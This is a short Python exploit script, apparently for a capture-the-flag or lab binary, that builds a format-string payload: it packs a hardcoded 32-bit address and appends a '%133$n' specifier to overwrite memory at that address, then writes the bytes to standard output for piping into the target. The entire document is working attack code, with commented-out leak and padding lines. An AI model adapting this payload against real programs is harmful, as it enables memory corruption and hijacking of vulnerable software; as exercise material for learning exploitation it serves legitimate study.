#!/usr/bin/env python3
import struct
import sys
from pwnpy.pwn import *

target = struct.pack('I', 0x08049638)

buf = b''
#buf += leak_from(1, 30)
buf += target
buf += b'%133$n  '
#buf += b'A'*64

#buf += struct.pack('I', 0xdeadbeef)
buf += b'\n'

sys.stdout.buffer.write(buf)
sys.stdout.flush()
